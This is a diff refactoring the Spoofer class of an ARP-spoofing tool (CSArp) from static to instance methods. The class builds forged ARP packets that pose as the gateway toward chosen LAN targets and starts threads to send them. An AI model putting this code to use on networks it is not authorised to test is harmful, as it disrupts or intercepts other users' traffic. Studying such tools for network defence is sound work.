@@ -11,28 +11,34 @@ using CSArp.Model.Extensions;
 
 namespace CSArp.Model
 {
-    public static class Spoofer
+    public class Spoofer
     {
-        private static Dictionary<IPAddress, PhysicalAddress> engagedclientlist;
-        private static bool disengageflag = true;
+        public WinPcapDevice NetworkAdapter { get; set; }
 
-        public static void Start(Dictionary<IPAddress, PhysicalAddress> targetlist, IPAddress gatewayipaddress, PhysicalAddress gatewaymacaddress, WinPcapDevice captureDevice)
+        private Dictionary<IPAddress, PhysicalAddress> engagedclientlist;
+        private bool disengageflag = true;
+
+        public void Start(Dictionary<IPAddress, PhysicalAddress> targetlist, IPAddress gatewayipaddress, PhysicalAddress gatewaymacaddress, WinPcapDevice networkAdapter)
         {
             engagedclientlist = new Dictionary<IPAddress, PhysicalAddress>();
-            captureDevice.Open();
+            if (!networkAdapter.Opened)
+            {
+                networkAdapter.Open();
+            }
+
             foreach (var target in targetlist)
             {
-                var myipaddress = captureDevice.ReadCurrentIpV4Address();
-                var arppacketforgatewayrequest = new ARPPacket(ARPOperation.Request, "00-00-00-00-00-00".Parse(), gatewayipaddress, captureDevice.MacAddress, target.Key);
-                var ethernetpacketforgatewayrequest = new EthernetPacket(captureDevice.MacAddress, gatewaymacaddress, EthernetPacketType.Arp);
+                var myipaddress = networkAdapter.ReadCurrentIpV4Address();
+                var arppacketforgatewayrequest = new ARPPacket(ARPOperation.Request, "00-00-00-00-00-00".Parse(), gatewayipaddress, networkAdapter.MacAddress, target.Key);
+                var ethernetpacketforgatewayrequest = new EthernetPacket(networkAdapter.MacAddress, gatewaymacaddress, EthernetPacketType.Arp);
                 ethernetpacketforgatewayrequest.PayloadPacket = arppacketforgatewayrequest;
                 ThreadBuffer.Add(new Thread(() =>
-                    SendSpoofingPacket(target.Key, target.Value, ethernetpacketforgatewayrequest, captureDevice)
+                    SendSpoofingPacket(target.Key, target.Value, ethernetpacketforgatewayrequest, networkAdapter)
                   ));
                 engagedclientlist.Add(target.Key, target.Value);
             };
         }
-        public static void StopAll()
+        public void StopAll()
         {
             disengageflag = true;
             if (engagedclientlist != null)
@@ -40,7 +46,7 @@ namespace CSArp.Model
                 engagedclientlist.Clear();
             }
         }
-        private static void SendSpoofingPacket(IPAddress ipAddress, PhysicalAddress physicalAddress, EthernetPacket ethernetpacketforgatewayrequest, WinPcapDevice captureDevice)
+        private void SendSpoofingPacket(IPAddress ipAddress, PhysicalAddress physicalAddress, EthernetPacket ethernetpacketforgatewayrequest, WinPcapDevice captureDevice)
         {
 
             disengageflag = false;
